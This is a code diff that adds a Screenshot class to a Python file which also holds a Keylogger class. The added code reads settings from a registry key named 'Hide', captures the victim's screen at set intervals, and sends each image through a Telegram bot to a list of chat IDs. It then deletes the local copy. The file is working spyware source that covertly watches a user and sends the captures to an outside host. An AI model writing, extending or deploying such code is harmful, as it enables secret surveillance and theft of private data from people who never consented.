@@ -387,6 +387,51 @@ class Keylogger:
         with Listener(on_press=press) as listener:
             listener.join()
 
+
+class Screenshot:
+    def __init__(self):
+        self.__regeditPath_Telegram = r"Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot"
+        self.__regeditPath_screenshot = r"Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Screenshot"
+        self.__path = str(WinRegistry(self.__regeditPath_screenshot).read_value('path'))
+        self.__interval = WinRegistry(self.__regeditPath_screenshot).read_value('interval_seconds')
+        self.__active = int(str(WinRegistry(self.__regeditPath_screenshot).read_value('active')))
+        self.__username = str(WinRegistry(r"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide").read_value('username'))
+
+    def _delete(self, name):
+        try:
+            os.remove(self.__path + name)
+            print("[ScreenShot] Delete Sucess")
+        except:
+            print("[ScreenShot] There was a mistake while erasing file")
+
+    def send(self):
+        # Crear carpeta
+        while True:
+            if self.__active == 1:
+                try:
+                    __token = str(WinRegistry(self.__regeditPath_Telegram).read_value('token'))
+                    __id = WinRegistry(self.__regeditPath_Telegram).read_value('id')
+                    name = self.__username + " " + Util().current_time() + " " + Util().random_char(5) + ".png"
+                    print("[Screenshot] File name: " + name)
+
+                    ImageGrab.grab().save(self.__path + "\\" + name)
+                    print("[ScreenShot] Take and save screenshot")
+                    bot = telepot.Bot(__token)
+                    for id in __id:
+                        try:
+                            bot.sendChatAction(id, 'upload_photo')
+                            bot.sendDocument(id, open(self.__path + "\\" + name, 'rb'))
+                            print("[SEND ScreenShot] Send keylogger to: [ID] " + str(id))
+                        except:
+                            print("[SEND ScreenShot] there was a mistake when sending the [ID] " + str(id))
+                    self._delete(name)
+                except:
+                    pass
+            else:
+                pass
+            self.__interval = WinRegistry(self.__regeditPath_screenshot).read_value('interval_seconds')
+            self.__active = int(str(WinRegistry(self.__regeditPath_screenshot).read_value('active')))
+            time.sleep(self.__interval)
 if __name__ == '__main__':
 
     pass
